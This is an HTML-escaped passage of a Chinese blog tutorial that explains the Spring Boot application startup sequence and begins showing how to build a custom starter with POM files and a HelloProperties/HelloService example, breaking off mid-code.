   ConfigurableApplicationContext context &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
   Collection&lt;/span&gt;&amp;lt;SpringBootExceptionReporter&amp;gt; exceptionReporters = &lt;span&gt;new&lt;/span&gt; ArrayList&amp;lt;&amp;gt;&lt;span&gt;();
   configureHeadlessProperty();
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;从类路径下META-INF/spring.factories获取SpringApplicationRunListeners&lt;/span&gt;
   SpringApplicationRunListeners listeners =&lt;span&gt; getRunListeners(args);
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;回调所有的获取SpringApplicationRunListener.starting()方法&lt;/span&gt;
&lt;span&gt;   listeners.starting();
   &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;封装命令行参数&lt;/span&gt;
      ApplicationArguments applicationArguments = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; DefaultApplicationArguments(
            args);
       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;准备环境 &lt;/span&gt;
      ConfigurableEnvironment environment =&lt;span&gt; prepareEnvironment(listeners,
            applicationArguments);&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;创建环境完成后回调SpringApplicationRunListener.environmentPrepared()；表示环境准备完成&lt;/span&gt;
&lt;span&gt;      configureIgnoreBeanInfo(environment);
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;打印Banner图&lt;/span&gt;
      Banner printedBanner =&lt;span&gt; printBanner(environment);
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;创建ApplicationContext,决定创建web的ioc还是普通的ioc  &lt;/span&gt;
      context =&lt;span&gt; createApplicationContext();
       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;异常分析报告&lt;/span&gt;
      exceptionReporters =&lt;span&gt; getSpringFactoriesInstances(
            SpringBootExceptionReporter.&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;new&lt;/span&gt; Class[] { ConfigurableApplicationContext.&lt;span&gt;class&lt;/span&gt;&lt;span&gt; }, context);
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;准备上下文环境，将environment保存到ioc中
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;applyInitializers()：回调之前保存的所有的ApplicationContextInitializer的initialize方法 
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;listeners.contextPrepared(context) 
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;prepareContext运行完成以后回调所有的SpringApplicationRunListener的contextLoaded（）&lt;/span&gt;
&lt;span&gt;      prepareContext(context, environment, listeners, applicationArguments,
            printedBanner);
       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;刷新容器,ioc容器初始化（如果是web应用还会创建嵌入式的Tomcat）
       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;扫描，创建，加载所有组件的地方,（配置类，组件，自动配置）&lt;/span&gt;
&lt;span&gt;      refreshContext(context);       
      afterRefresh(context, applicationArguments);
      stopWatch.stop();
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.logStartupInfo) {
         &lt;/span&gt;&lt;span&gt;new&lt;/span&gt; StartupInfoLogger(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.mainApplicationClass)
               .logStarted(getApplicationLog(), stopWatch);
      }
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;所有的SpringApplicationRunListener回调started方法&lt;/span&gt;
&lt;span&gt;      listeners.started(context);
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;从ioc容器中获取所有的ApplicationRunner和CommandLineRunner进行回调，
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;ApplicationRunner先回调，CommandLineRunner再回调&lt;/span&gt;
&lt;span&gt;      callRunners(context, applicationArguments);
   }
   &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable ex) {
      handleRunFailure(context, ex, exceptionReporters, listeners);
      &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; IllegalStateException(ex);
   }

   &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;所有的SpringApplicationRunListener回调running方法&lt;/span&gt;
&lt;span&gt;      listeners.running(context);
   }
   &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable ex) {
      handleRunFailure(context, ex, exceptionReporters, &lt;/span&gt;&lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
      &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; IllegalStateException(ex);
   }
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;整个SpringBoot应用启动完成以后返回启动的ioc容器&lt;/span&gt;
   &lt;span&gt;return&lt;/span&gt;&lt;span&gt; context;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;前面的代码不用分析，主要是准备对象，我们从 SpringApplicationRunListeners listeners = getRunListeners(args)开始分析，&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第一步&lt;/strong&gt;&lt;span&gt;：是从类路径下META-INF/spring.factories获取SpringApplicationRunListeners，&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;这个方法跟前面分析的两个获取配置方法类似。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第二步&lt;/strong&gt;&lt;span&gt;：回调所有的获取SpringApplicationRunListener.starting()方法。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第三步&lt;/strong&gt;&lt;span&gt;： 封装命令行参数。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第四步&lt;/strong&gt;&lt;span&gt;：准备环境，调用prepareEnvironment方法。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第五步&lt;/strong&gt;&lt;span&gt;：打印Banner图（就是启动时的标识图）。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第六步&lt;/strong&gt;&lt;span&gt;：创建ApplicationContext,决定创建web的ioc还是普通的ioc。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第七步&lt;/strong&gt;&lt;span&gt;：异常分析报告。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第八步&lt;/strong&gt;&lt;span&gt;：准备上下文环境，将environment保存到ioc中，这个方法需要仔细分析下，我们再进入这个方法&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1113901/201904/1113901-20190428155130078-526787422.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;这里面有一个applyInitializers方法,这里是回调之前保存的所有的ApplicationContextInitializer的initialize方法&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1113901/201904/1113901-20190428155215651-365002939.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;还有一个listeners.contextPrepared(context)，这里是回调所有的SpringApplicationRunListener的contextPrepared()，&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;最后listeners.contextLoaded(context) 是prepareContext运行完成以后回调所有的SpringApplicationRunListener的contextLoaded（）。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第九步&lt;/strong&gt;&lt;span&gt;：刷新容器,ioc容器初始化（如果是web应用还会创建嵌入式的Tomcat）,这个就是扫描，创建，加载所有组件的地方,（配置类，组件，自动配置）。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第十步&lt;/strong&gt;&lt;span&gt;：所有的SpringApplicationRunListener回调started方法。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第十一步&lt;/strong&gt;&lt;span&gt;：从ioc容器中获取所有的ApplicationRunner和CommandLineRunner进行回调，ApplicationRunner先回调，CommandLineRunner再回调。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第十二步&lt;/strong&gt;&lt;span&gt;：所有的SpringApplicationRunListener回调running方法。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第十三步&lt;/strong&gt;&lt;span&gt;：整个SpringBoot应用启动完成以后返回启动的ioc容器。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block md-focus&quot;&gt;&lt;span&gt;这就是run的全部过程，想要更详细的了解还需自己去看源码。&lt;/span&gt;&lt;/p&gt;
&lt;h2 class=&quot;md-end-block md-focus&quot;&gt;&lt;span&gt;三、&lt;/span&gt;&lt;span class=&quot;md-expand&quot;&gt;自定义starter&lt;/span&gt;&lt;/h2&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;自定义starter（场景启动器），我们要做的事情是两个：确定依赖和编写自动配置。我们重点要做的就是编写自动配置，我们之前写过一些自动配置，主要是注解配置的使用，主要的注解有：&lt;/span&gt;&lt;/p&gt;
&lt;ul class=&quot;ul-list&quot; data-mark=&quot;-&quot; readability=&quot;3&quot;&gt;&lt;li class=&quot;md-list-item&quot; readability=&quot;-1&quot;&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;@Configuration ：指定这个类是一个配置类&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;md-list-item&quot; readability=&quot;-1&quot;&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;@ConditionalOnXXX ：在指定条件成立的情况下自动配置类生效&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;md-list-item&quot; readability=&quot;-1&quot;&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;@AutoConfigureAfter：指定自动配置类的顺序&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;md-list-item&quot; readability=&quot;-1&quot;&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;@Bean：给容器中添加组件&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;md-list-item&quot; readability=&quot;-1&quot;&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;@ConfigurationPropertie：结合相关xxxProperties类来绑定相关的配置&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;md-list-item&quot; readability=&quot;-1&quot;&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;@EnableConfigurationProperties：让xxxProperties生效加入到容器中&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;按照这些注解写好自动配置类后，我们还需要进行自动配置的加载，加载方式是将需要启动就加载的自动配置类，配置在META-INF/spring.factories，启动器的大致原理是如此，而启动器的实际设计是有一定模式的，就是&lt;span&gt;&lt;strong&gt;启动器模块是一个空 JAR 文件，仅提供辅助性依赖管理&lt;/strong&gt;&lt;span&gt;，而自动配置模块应该再重新设计一个，然后启动器再去引用这个自动配置模块。Springboot就是如此设计的：&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1113901/201904/1113901-20190428155316224-1071755220.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;另外还有一个命名规则：&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;官方命名空间&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;span class=&quot;md-softbreak&quot;&gt;&lt;span&gt;– 前缀：“spring-boot-starter-”&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;span class=&quot;md-softbreak&quot;&gt;&lt;span&gt;&lt;span class=&quot;md-softbreak&quot;&gt;&lt;span&gt;– 模式：spring-boot-starter-模块名&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;span class=&quot;md-softbreak&quot;&gt;&lt;span&gt;&lt;span class=&quot;md-softbreak&quot;&gt;&lt;span&gt;&lt;span class=&quot;md-softbreak&quot;&gt;&lt;span&gt;– 举例：spring-boot-starter-web、spring-boot-starter-actuator、spring-boot-starter-jdbc&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block md-focus&quot;&gt;&lt;span&gt;自定义命名空间&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block md-focus&quot;&gt;&lt;span&gt;&lt;span class=&quot;md-softbreak&quot;&gt;&lt;span&gt;– 后缀：“-spring-boot-starter”&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block md-focus&quot;&gt;&lt;span&gt;&lt;span class=&quot;md-softbreak&quot;&gt;&lt;span&gt;&lt;span class=&quot;md-softbreak&quot;&gt;&lt;span&gt;– 模式：模块-spring-boot-starter&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block md-focus&quot;&gt;&lt;span&gt;&lt;span class=&quot;md-softbreak&quot;&gt;&lt;span&gt;&lt;span class=&quot;md-softbreak&quot;&gt;&lt;span&gt;&lt;span class=&quot;md-softbreak&quot;&gt;&lt;span&gt;– 举例：mybatis-spring-boot-starter&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 class=&quot;md-end-block md-heading md-focus&quot;&gt;&lt;span class=&quot;md-expand&quot;&gt;3.1 创建自定义starter&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span class=&quot;md-expand&quot;&gt;&lt;span class=&quot;md-expand&quot;&gt;&lt;strong&gt;&lt;span&gt;第一步：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;md-expand&quot;&gt;因为我们需要创建两个模块，所以先新建一个空的项目，然后以模块形式创建两个模块。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1113901/201904/1113901-20190428155452574-1060804299.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-expand&quot;&gt;&lt;strong&gt;&lt;span&gt;第二步&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;md-expand&quot;&gt;：再创建两个模块，一个starter和一个自动配置模块&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-expand&quot;&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1113901/201904/1113901-20190428155534999-1053963651.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;具体的创建过程就不赘述了，就是最简单的项目，去掉不需要的文件，创建完成结构如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1113901/201904/1113901-20190428155558403-1771037522.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block md-focus&quot;&gt;&lt;span&gt;&lt;strong&gt;第三步&lt;/strong&gt;&lt;span&gt;：我们先将自动配置模块导入starter中，让启动模块依赖自动配置模块&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;启动模块的POM文件加入依赖&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependencies&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt;引入自动配置模块&lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;com.yuanqinnan-starter&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;yuanqinnan-springboot-starter-autoconfigurer&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;0.0.1-SNAPSHOT&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependencies&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;自动配置模块的完整POM文件：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;?&lt;/span&gt;&lt;span&gt;xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;&lt;/span&gt;&lt;span&gt;?&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;project &lt;/span&gt;&lt;span&gt;xmlns&lt;/span&gt;&lt;span&gt;=&quot;http://maven.apache.org/POM/4.0.0&quot;&lt;/span&gt;&lt;span&gt; xmlns:xsi&lt;/span&gt;&lt;span&gt;=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&lt;/span&gt;&lt;span&gt;
         xsi:schemaLocation&lt;/span&gt;&lt;span&gt;=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;modelVersion&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;4.0.0&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;modelVersion&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;parent&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.springframework.boot&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;spring-boot-starter-parent&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;2.1.4.RELEASE&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;relativePath&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt; &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; lookup parent from repository &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;parent&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;com.yuanqinnan-starter&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;yuanqinnan-springboot-starter-autoconfigurer&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;0.0.1-SNAPSHOT&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;packaging&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;jar&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;packaging&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;properties&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;java.version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;1.8&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;java.version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;properties&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependencies&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt;引入spring-boot-starter；所有starter的基本配置&lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.springframework.boot&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;spring-boot-starter&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependencies&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;project&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;至此，两个项目基本创建完成，现在我们实现简单的配置。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第五步&lt;/strong&gt;&lt;span&gt;：对自动配置类进行自动配置代码编写&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block md-focus&quot;&gt;&lt;span&gt;先编写一个配置类，用于配置：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
@ConfigurationProperties(prefix = &quot;yuanqinnan.hello&quot;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; HelloProperties {
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;前缀&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt;&lt;span&gt; String prefix;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;后缀&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt;&lt;span&gt; String suffix;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getPrefix() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; prefix;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setPrefix(String prefix) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.prefix =&lt;span&gt; prefix;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getSuffix() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; suffix;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setSuffix(String suffix) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.suffix =&lt;span&gt; suffix;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;再编写一个服务&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; HelloService {

    HelloProperties helloProperties;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; HelloProperties getHelloProperties() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; helloProperties;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setHelloProperties(HelloProperties helloProperties) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.helloProperties =&lt;span&gt; helloProperties;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String sayHello(String name) {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; helloProperties.getPrefix() + &quot;-&quot; + name +&lt;span&gt; helloProperties.getSuffix();
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;然后再将这个服务注入组件：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Configuration
@ConditionalOnWebApplication &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;web应用才生效&lt;/span&gt;
